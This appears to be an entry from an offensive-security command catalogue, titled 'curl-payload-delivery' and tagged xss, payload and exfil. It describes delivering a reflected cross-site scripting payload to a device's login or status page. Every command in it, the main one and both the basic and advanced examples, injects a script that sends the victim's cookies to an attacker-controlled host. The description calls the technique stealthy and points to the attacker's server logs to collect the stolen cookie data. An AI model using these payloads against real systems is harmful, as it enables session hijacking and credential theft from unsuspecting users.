---
data: >-
  curl -G "http://<device-ip>/login.html" --data-urlencode "msg=<script>var
  i=new Image();i.src='http://attacker.com/steal?'+document.cookie;</script>"
tags:
  - xss
  - payload
  - exfil
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.648Z'
id: c629b5f8-1f09-4f35-b839-18e0a447119d
verified: false
validated: true
submitted: true
---
# curl-payload-delivery

## Command

```bash
curl -G "http://<device-ip>/login.html" --data-urlencode "msg=<script>var i=new Image();i.src='http://attacker.com/steal?'+document.cookie;</script>"
```

## Description

Delivers a reflected XSS payload that exfiltrates cookies to an attacker-controlled server using a stealthy Image src method.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-G` | GET request | Yes |
| `--data-urlencode` | Encodes malicious script | Yes |
| `msg` | Target parameter | No |
| `attacker.com` | Exfiltration endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -G "http://192.168.1.1/login.html" --data-urlencode "msg=<script>fetch('http://attacker.com?'+document.cookie)</script>"
```

### Advanced Usage

```bash
curl -G "http://192.168.1.1/status.html" --data-urlencode "filter=<script>document.location='http://attacker.com?'+btoa(document.cookie)</script>"
```

## Expected Output

Server response with reflected payload; check attacker server logs for incoming cookie data.

## Related

- [[Related Procedure]]
